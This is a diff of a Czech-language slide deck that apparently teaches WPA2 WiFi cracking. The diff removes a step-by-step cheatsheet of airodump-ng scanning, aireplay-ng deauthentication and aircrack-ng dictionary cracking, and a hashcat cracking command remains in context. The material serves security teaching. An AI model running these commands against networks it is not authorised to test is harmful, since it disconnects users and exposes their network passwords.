@@ -60,45 +60,6 @@
         text-align: left;
         font-size: 0.85em;
       }
-      .cmd-table {
-        width: 100%;
-        font-size: 0.44em;
-        line-height: 1.25;
-        border-collapse: collapse;
-        text-align: left;
-        margin-top: 0.3rem;
-      }
-      .cmd-table th {
-        background-color: #007acc;
-        color: white;
-        padding: 0.35rem 0.5rem;
-        font-size: 1.1em;
-      }
-      .cmd-table td {
-        padding: 0.3rem 0.5rem;
-        border-bottom: 1px solid #e0e0e0;
-        vertical-align: middle;
-      }
-      .cmd-code {
-        font-family: monospace;
-        background-color: #1e1e1e;
-        color: #dcdcdc;
-        padding: 0.25rem 0.45rem;
-        border-radius: 4px;
-        white-space: pre-wrap;
-        word-break: break-all;
-        font-size: 1.15em;
-        line-height: 1.2;
-      }
-      .step-badge {
-        background: #f6821f;
-        color: white;
-        font-weight: bold;
-        padding: 0.15rem 0.4rem;
-        border-radius: 4px;
-        white-space: nowrap;
-        font-size: 1.1em;
-      }
     </style>
   </head>
   <body>
@@ -121,7 +82,7 @@
             <li class="fragment">Skenování okolních síťových vysílačů (<code>airodump-ng</code>)</li>
             <li class="fragment">Deautentizační útok a zachycení WPA2 Handshaku (<code>aireplay-ng</code>)</li>
             <li class="fragment">Slovníkový útok na heslo (<code>aircrack-ng</code> a <code>hashcat</code>)</li>
-            <li class="fragment"><strong>Samostatné praktické cvičení (Všechny příkazy naráz!)</strong></li>
+            <li class="fragment"><strong>Samostatné praktické cvičení</strong></li>
           </ol>
         </section>
 
@@ -355,66 +316,20 @@ hashcat -m 22000 export.hc22000 /usr/share/wordlists/rockyou.txt</code></pre>
           </section>
         </section>
 
-        <!-- KATEGORIE 6: Praktické cvičení - Všechny příkazy na jednom slajdu -->
+        <!-- KATEGORIE 6: Praktické cvičení -->
         <section>
           <section>
             <h2>Kategorie 6</h2>
-            <h3>Praktické cvičení: Přehled příkazů</h3>
-          </section>
-
-          <section style="padding: 0;">
-            <h3 style="font-size: 1.15em; margin-bottom: 0.2rem;">Všechny příkazy pro cvičení (Cheatsheet)</h3>
-            <p style="font-size: 0.6em; color: #666; margin-bottom: 0.3rem;">Karta v Monitor módu (<code>wlan0mon</code>)</p>
-            <table class="cmd-table">
-              <thead>
-                <tr>
-                  <th style="width: 12%;">Krok</th>
-                  <th style="width: 53%;">Příkaz (Command)</th>
-                  <th style="width: 35%;">Popis činnosti</th>
-                </tr>
-              </thead>
-              <tbody>
-                <tr>
-                  <td><span class="step-badge">Krok 1</span></td>
-                  <td><div class="cmd-code">iwconfig</div></td>
-                  <td>Ověření rozhraní v Monitor módu.</td>
-                </tr>
-                <tr>
-                  <td><span class="step-badge">Krok 2</span></td>
-                  <td><div class="cmd-code">sudo airodump-ng wlan0mon</div></td>
-                  <td>Skenování sítí. Poznamenej <strong>BSSID</strong> a <strong>CH</strong>.</td>
-                </tr>
-                <tr>
-                  <td><span class="step-badge">Krok 3</span></td>
-                  <td><div class="cmd-code">sudo airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt; -w pokus wlan0mon</div></td>
-                  <td>Zacílení a ukládání paketů do <code>pokus-01.cap</code>. Nech běžet!</td>
-                </tr>
-                <tr>
-                  <td><span class="step-badge">Krok 4</span></td>
-                  <td><div class="cmd-code">sudo aireplay-ng --deauth 5 -a &lt;BSSID&gt; -c &lt;MAC_KLIENTA&gt; wlan0mon</div></td>
-                  <td><em>(V novém okně)</em> Deautentizace pro přihlášení.</td>
-                </tr>
-                <tr>
-                  <td><span class="step-badge">Krok 5</span></td>
-                  <td><div class="cmd-code"># Sleduj v 1. okně: [ WPA handshake: BSSID ]</div></td>
-                  <td>Ověř zachycení a stiskni <code>Ctrl + C</code> pro ukončení.</td>
-                </tr>
-                <tr>
-                  <td><span class="step-badge">Krok 6</span></td>
-                  <td><div class="cmd-code">aircrack-ng -w /usr/share/wordlists/rockyou.txt pokus-01.cap</div></td>
-                  <td>Slovníkový útok a odhalení hesla (<code>KEY FOUND!</code>).</td>
-                </tr>
-              </tbody>
-            </table>
+            <h3>Samostatné praktické cvičení</h3>
           </section>
 
           <section>
-            <h2>Samostatná prezentace příkazů</h2>
+            <h2>Samostatné cvičení pro studenty</h2>
             <div class="highlight-box">
-              <p><strong>Samostatný tahák s příkazy (Cheatsheet Prezentace):</strong></p>
-              <p><a href="commands.html" target="_blank" style="font-size: 1.3em; font-weight: bold; color: #007acc;">commands.html &rarr; Otevřít prezentaci pouze s příkazy</a></p>
+              <p><strong>Praktický tahák s příkazy (Cheatsheet):</strong></p>
+              <p><a href="commands.html" target="_blank" style="font-size: 1.4em; font-weight: bold; color: #007acc;">commands.html &rarr; Otevřít prezentaci pouze s příkazy</a></p>
             </div>
-            <p style="font-size: 0.85em; margin-top: 1rem;">Můžete nechat promítnutou prezentaci <code>commands.html</code> se všemi příkazy po celou dobu praktického cvičení!</p>
+            <p style="font-size: 0.85em; margin-top: 1.5rem;">Otevřete si v novém okně prezentaci <code>commands.html</code>, kde máte všechny příkazy přehledně seřazené po jednotlivých krocích!</p>
           </section>
 
           <section>
